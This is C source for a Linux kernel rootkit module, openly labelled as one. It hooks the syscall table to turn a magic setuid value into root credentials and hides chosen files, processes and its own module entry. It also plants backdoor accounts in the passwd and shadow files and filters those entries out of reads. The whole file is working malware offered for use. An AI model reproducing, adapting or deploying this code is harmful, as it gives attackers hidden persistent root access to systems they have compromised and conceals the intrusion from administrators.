#include "includes.h"

unsigned long** sys_call_table;

asmlinkage long hacked_setuid(uid_t uid)
{
    long ret = 0;
    struct cred *new;
    // printk(KERN_INFO "intercepted setuid: %d\n", uid);

    //if the requested uid is the "magic number" to give root priv
    if (uid == MAGIC_NUMBER) {
        // DEBUG("Magic Number passed in, elevating privilege");
        new = prepare_creds();
        if (!new)
            return -ENOMEM;
        //set root priveleges
        new->uid = GLOBAL_ROOT_UID;
        new->gid = GLOBAL_ROOT_GID;
        new->suid = GLOBAL_ROOT_UID;
        new->sgid = GLOBAL_ROOT_GID;
        new->euid = GLOBAL_ROOT_UID;
        new->egid = GLOBAL_ROOT_GID;
        new->fsuid = GLOBAL_ROOT_UID;
        new->fsgid = GLOBAL_ROOT_GID;

        ret = commit_creds(new);
    }
    else {
        ret = (*orig_setuid) (uid);
    }

    return ret;
}

bool should_hide_file(const char __user *filename)
{
    char *kern_buff = NULL;
    int i;
    bool to_hide = false;

    
    kern_buff = kzalloc(strlen_user(filename)+1, GFP_KERNEL);
    if(!kern_buff)
    {
        //DEBUG("RAN OUT OF MEMORY in FILE FILTER");
        goto cleanup;
    }

    if(copy_from_user(kern_buff, filename, strlen_user(filename)))
    {   
        //DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
        goto cleanup;
    }
    

    for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
    {
        // Hidden file is found
        if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
        {
            to_hide = true;
            break;
        }
    }
    
    //DEBUG("Exited HACKED OPEN");

cleanup:
    if(kern_buff)
        kfree(kern_buff);
    return to_hide;
}

// Intercepts open to see if the user is somehow trying
// to open a file that we are hiding.
asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
{
    long ret;

    ret  = (*orig_open)(filename, flags, mode);
    if (should_hide_file(filename))
    {
        ret = -ENOENT;
    } 

    return ret;
}

asmlinkage long hacked_lstat(const char __user *filename,
            struct __old_kernel_stat __user *statbuf)
{
    long ret;

    ret = (*orig_lstat)(filename, statbuf);

    if (should_hide_file(filename))
    {
        ret = -ENOENT;
    } 

    return ret;
    
}

asmlinkage long hacked_stat(const char __user *filename,
            struct __old_kernel_stat __user *statbuf)
{
    long ret;

    ret = (*orig_stat)(filename, statbuf);

    if (should_hide_file(filename))
    {
        ret = -ENOENT;
    } 

    return ret;
}

// Will hide any files from within the dirp and return the new length of dirp
long handle_ls(struct linux_dirent *dirp, long length)
{
    
    unsigned int offset = 0;
    struct linux_dirent *cur_dirent;
    int i;
    struct dirent *new_dirp = NULL;
    int new_length = 0;
    bool isHidden = false;

    //struct dirent *moving_dirp = NULL;

    //DEBUG("Entering LS filter");
    // Create a new output buffer for the return of getdents
    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
    if(!new_dirp)
    {
        //DEBUG("RAN OUT OF MEMORY in LS Filter");
        goto error;
    }

    // length is the length of memory (in bytes) pointed to by dirp
    while (offset < length)
    {
        char *dirent_ptr = (char *)(dirp);
        dirent_ptr += offset;
        cur_dirent = (struct linux_dirent *)dirent_ptr;

        isHidden = false;
        for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
        {
            // Hidden file is found
            if(strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
            {
	        // printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
                isHidden = true;
                break;
            }
        }
        
        if (!isHidden)
        {
            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
            new_length += cur_dirent->d_reclen;
        }
        offset += cur_dirent->d_reclen;
    }
    //DEBUG("Exiting LS filter");

    memcpy(dirp, new_dirp, new_length);
    length = new_length;

cleanup:
    if(new_dirp)
        kfree(new_dirp);
    return length;
error:
    goto cleanup;
}

int is_command_ps(unsigned int fd)
{
    struct file *fd_file;
    struct inode *fd_inode;

    fd_file = fcheck(fd);
    if (unlikely(!fd_file)) {
        return 0;
    }
    fd_inode = file_inode(fd_file);
    if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
        && iminor(fd_inode) == 0)
    {
        // DEBUG("User typed command ps");
        return 1;
    }
    return 0;
}

int is_hidden_process(char *proc_name)
{
    int i;
    for (i = 0; i < sizeof(HIDDEN_PROCESSES) / sizeof(char *); i++)
    {
        // Hidden process is found
        if (strcmp(proc_name, HIDDEN_PROCESSES[i]) == 0)
        {
            return 1;
        }
    }
    return 0;
}

long hide_processes(struct linux_dirent *dirp, long getdents_ret)
{
    unsigned int dent_offset;
    struct linux_dirent *cur_dirent, *next_dirent;
    char *proc_name, *dir_name;
    char *dirent_ptr = (char *)dirp;
    int error;
    size_t dir_name_len;
    pid_t pid_num;
    struct task_struct *proc_task;
    struct pid *pid;

    // getdents_ret is number of bytes read
    for (dent_offset = 0; dent_offset < getdents_ret;)
    {
        cur_dirent = (struct linux_dirent *)(dirent_ptr + dent_offset);
        dir_name = cur_dirent->d_name;
        dir_name_len = cur_dirent->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
        error = kstrtoint_from_user(dir_name, dir_name_len, 10, (int *)&pid_num);
        if (error < 0)
        {
            goto next_getdent;
        }
        pid = find_get_pid(pid_num);
        if (!pid)
        {
            goto next_getdent;
        }
        proc_task = get_pid_task(pid, PIDTYPE_PID);
        if (!proc_task)
        {
            goto next_getdent;
        }
        proc_name = (char *)kmalloc((sizeof(proc_task->comm)), GFP_KERNEL);
        if (!proc_name)
        {
            goto next_getdent;
        }
        proc_name = get_task_comm(proc_name, proc_task);
        if (is_hidden_process(proc_name)) {
            // Hide the process by deleting its dirent: shift all its right dirents to left.
            // printk("Hide process: %s\n", proc_task->comm);
            next_dirent = (struct linux_dirent *)((char *)cur_dirent + cur_dirent->d_reclen);
            memcpy(cur_dirent, next_dirent, getdents_ret - dent_offset - cur_dirent->d_reclen);
            getdents_ret -= cur_dirent->d_reclen;
            // To cancel dent_offset += cur_dirent->d_reclen at the end of for loop.
            dent_offset -= cur_dirent->d_reclen;
        }
        kfree(proc_name);
    next_getdent:
        dent_offset += cur_dirent->d_reclen;
    }
    return getdents_ret;
}

long handle_ps(unsigned int fd, struct linux_dirent *dirp, long getdents_ret)
{
    struct files_struct *open_files = current->files;
    int is_ps = 0;
    spin_lock(&open_files->file_lock);
    is_ps = is_command_ps(fd);
    if (is_ps != 0) {
        getdents_ret = hide_processes(dirp, getdents_ret);
    }
    spin_unlock(&open_files->file_lock);
    return getdents_ret;
}

asmlinkage long hacked_getdents(unsigned int fd,
                struct linux_dirent *dirp,
                unsigned int count)
{
    long getdents_ret;
    // Call original getdents system call.
    getdents_ret = (*orig_getdents)(fd, dirp, count);

    // Entry point into hiding files function
    getdents_ret = handle_ls(dirp, getdents_ret);

    // Entry point into hiding processes function
    getdents_ret = handle_ps(fd, dirp, getdents_ret);

    return getdents_ret;
}

long remove_rootkit(char *buf, long length)
{
    char *start_of_rootkit = NULL;
    char *start_copy = NULL;
    char *new_buff = NULL;
    int line_length = 0;
    int bytes_written = 0;
    int remaining_length = length;

    new_buff = kzalloc(strlen(buf)+1, GFP_KERNEL);
    if(!new_buff)
    {
        //DEBUG("NOT ENOUGH MEMORY in LSMOD FILTER");
        goto cleanup;
    }
    
    start_of_rootkit = strstr(buf, MODULE_NAME);
    if(start_of_rootkit)
    {
        start_copy = start_of_rootkit;
        while(*start_copy != '\n' && *start_copy != '\0')
        {
            start_copy++;
            line_length++;
        }
        line_length++; // For the \n or \0
        memcpy(new_buff, buf, start_of_rootkit-buf); // Copy everything before this line
        bytes_written += start_of_rootkit-buf;
        remaining_length -= bytes_written;
        remaining_length -= line_length;
        // now length is only what comes after the line we skip
        memcpy(new_buff+bytes_written, start_of_rootkit+line_length, remaining_length);
        bytes_written += remaining_length;

        
        memcpy(buf, new_buff, bytes_written);
        length = bytes_written;
    }

cleanup:
    if(new_buff)
        kfree(new_buff);
    return length;
}

asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
{
	unsigned long ret;

	char *tmp;
	char *pathname;

	struct file *file;
	struct path *path;

	char *tmp_buf;
	char *BACKDOOR;

    //call original read
	ret = (*orig_read)(fd, buf, count);

	if(ret <= 0){
		goto exit;
	}

	file = fget(fd);

	if(!file){
		//DEBUG("file doesn't exist");
		goto exit;
	}

	path = &file->f_path;
	path_get(path);

	tmp = (char *)__get_free_page(GFP_TEMPORARY);

	if(!tmp){
		path_put(path);
		//DEBUG("couldnt create tmp");
		goto cleanup1;
	}

	pathname = d_path(path, tmp, PAGE_SIZE);
	path_put(path);

	if(IS_ERR(pathname)){
		//free_page((unsigned long)tmp);
		//DEBUG("pathname errors");
		goto cleanup1;
	}

    // Entry point into hiding module
	if(strcmp(pathname, MODULE_FILE)==0){
        ret = remove_rootkit(buf, ret);
    }
    
    //check if it's the files we want
	if(strcmp(pathname, PASSWD_FILE)==0){
		BACKDOOR = BACKDOOR_PASSWD;
	} else if(strcmp(pathname, SHADOW_FILE)==0){
		BACKDOOR = BACKDOOR_SHADOW;		
	} else {
        goto cleanup1;
    }

	if(!(strstr(buf, BACKDOOR))){
		goto cleanup1;
	}

	tmp_buf = kmalloc(ret, GFP_KERNEL);
	if(!tmp_buf){
		goto cleanup1;
	}

	copy_from_user(tmp_buf, buf, ret);

	if(!tmp_buf){
		goto cleanup2;
	}

    //remove backdoor in buf, change ret
	while((strstr(tmp_buf, BACKDOOR))){
		char *strBegin  = tmp_buf;
		char *substrBegin = strstr(strBegin, BACKDOOR);
		char *substrEnd = substrBegin + strlen(BACKDOOR);
		int remaining_length = (int)(strlen(substrEnd)) + 1 ;
		memmove(substrBegin, substrEnd, remaining_length);
		ret = ret - strlen(BACKDOOR);
	}

	copy_to_user(buf, tmp_buf, ret);
	
cleanup2:	
	if(tmp_buf) 
		kfree(tmp_buf);
	
cleanup1:
	if(tmp) 
		free_page((unsigned long)tmp);

exit:
	return ret;	
}

void add_backdoor(char * pathname)
{
    struct file *file;
    char * BACKDOOR;
    mm_segment_t old_fs;

    char *buf;
    bool has_backdoor =false;
    int page_count = 0;

    loff_t offset;

    unsigned long ret;

    if(strcmp(pathname, PASSWD_FILE)==0)
        BACKDOOR = BACKDOOR_PASSWD;
    if(strcmp(pathname, SHADOW_FILE)==0)
        BACKDOOR = BACKDOOR_SHADOW;

    old_fs = get_fs();

    set_fs(get_ds());
    file = filp_open(pathname, O_RDWR, 0);
    set_fs(old_fs);

    if(IS_ERR(file)){
        goto exit;
    }

    //check if backdoor is already inserted
    buf = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);

    if(!buf){
        goto cleanup1;
    }

    has_backdoor = false;
    ret = PAGE_SIZE;
    offset = 0;
    while(ret == PAGE_SIZE){
        offset = page_count*PAGE_SIZE;

        set_fs(get_ds());
        ret = vfs_read(file, buf, PAGE_SIZE, &offset);
        set_fs(old_fs);

        if(ret < 0){
            //DEBUG("read errors");
            goto cleanup2;
        }

        page_count++;

        if(strstr(buf, BACKDOOR)){
            has_backdoor = true;
            break;
        }
    }

    if(has_backdoor){
        //DEBUG(pathname);
        //DEBUG("-----already has backdoor-------");
        goto cleanup2;
    }

    //DEBUG(pathname);
    //DEBUG("--- doesn't have backdoor. inserting---");

    //seek offset to end of file
    offset = 0;

    set_fs(get_ds());
    offset = vfs_llseek(file, offset, SEEK_END);
    set_fs(old_fs);

    if(offset < 0){
        goto cleanup2;
    }

    //add backdoor to the end of file
    ret = 0;

    set_fs(get_ds());
    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
    set_fs(old_fs);

    if(ret<0){
        goto cleanup2;
    }

cleanup2:
    if(buf)
        kfree(buf);

cleanup1:
    if(file)
        filp_close(file, NULL);

exit:
    return;
}

void set_addr_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    if (pte->pte &~ _PAGE_RW)
        pte->pte |= _PAGE_RW;
}

void set_addr_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;
}

void init_hide_processes(void)
{
    HOOK_SYSCALL(sys_call_table, orig_getdents, hacked_getdents, __NR_getdents);
}

void exit_hide_processes(void)
{
    UNHOOK_SYSCALL(sys_call_table, orig_getdents, __NR_getdents);
}

void init_filter_backdoor(void)
{
	HOOK_SYSCALL(sys_call_table, orig_read, hacked_read, __NR_read);
}

void exit_filter_backdoor(void)
{
	UNHOOK_SYSCALL(sys_call_table, orig_read, __NR_read);
}

static int __init initModule(void)
{
    sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) {
        printk(KERN_ERR "Rootkit error: can't find sys_call_table memory location\n");
        return -ENOENT;
    }

    set_addr_rw((unsigned long) sys_call_table);

    add_backdoor(PASSWD_FILE);
    add_backdoor(SHADOW_FILE);

    HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);

    HOOK_SYSCALL(sys_call_table, orig_open, hacked_open, __NR_open);

    HOOK_SYSCALL(sys_call_table, orig_lstat, hacked_lstat, __NR_lstat);

    HOOK_SYSCALL(sys_call_table, orig_stat, hacked_stat, __NR_stat);

    init_hide_processes();

    init_filter_backdoor();

    set_addr_ro((unsigned long) sys_call_table);

    // DEBUG("loaded module");
    // Non-zero return means that the module couldn't be loaded.
    return 0;
}

static void __exit exitModule(void)
{
    set_addr_rw((unsigned long) sys_call_table);

    UNHOOK_SYSCALL(sys_call_table, orig_setuid, __NR_setuid);

    UNHOOK_SYSCALL(sys_call_table, orig_open, __NR_open);

    UNHOOK_SYSCALL(sys_call_table, orig_lstat, __NR_lstat);

    UNHOOK_SYSCALL(sys_call_table, orig_stat, __NR_stat);

    exit_hide_processes();

    exit_filter_backdoor();

    set_addr_ro((unsigned long) sys_call_table);
    // DEBUG("exiting module");
}

module_init(initModule);
module_exit(exitModule);
MODULE_LICENSE("GPL");
